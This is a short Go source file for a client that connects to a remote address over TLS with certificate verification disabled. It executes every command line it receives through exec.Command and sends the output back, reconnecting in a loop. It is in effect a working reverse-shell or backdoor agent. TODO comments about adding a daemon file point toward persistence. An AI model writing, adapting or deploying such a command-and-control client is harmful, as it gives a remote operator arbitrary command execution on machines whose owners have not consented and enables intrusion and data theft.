package client

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

type Client struct {
	Addr       string
	Conn       net.Conn
	ReconnTime time.Duration
}

func (c *Client) Run() {
	c.connect()

	for {
		err := c.executeCommand()
		if err != nil {
			c.reconnect()
		}
	}
}

func (c *Client) connect() {
	conn, err := c.dial()

	if err != nil {
		log.Println("[TCP] Dialing connection", err)
		c.reconnect()
		return
	}

	c.Conn = conn
}

func (c *Client) reconnect() {
	log.Printf("[*] Reconnecting in %d seconds\n", c.ReconnTime)
	time.Sleep(c.ReconnTime * time.Second)
	c.connect()
}

func (c *Client) dial() (*tls.Conn, error) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	return tls.Dial("tcp", c.Addr, conf)
}

// add protobuf
// cd
// exec
// save logs to file
// add daemon file

func (c *Client) executeCommand() (error) {
	reader := bufio.NewReader(c.Conn)
	req, err := reader.ReadString('\r')

	if err != nil {
		log.Printf("[TCP] Reading the sent message %s\n", err)
		return err
	}

	cont := strings.Split(strings.TrimSpace(req), " ")
	cmd := cont[0]
	args := append(cont[:0], cont[0+1:]...)

	res := exec.Command(cmd, args...)
	output, err := res.Output()

	if err != nil {
		s := fmt.Sprintf("Error command %s\n", err)
		c.Conn.Write([]byte(s + "\r"))
		return nil
	}

	c.Conn.Write([]byte(string(output) + "\r"))
	return nil
}
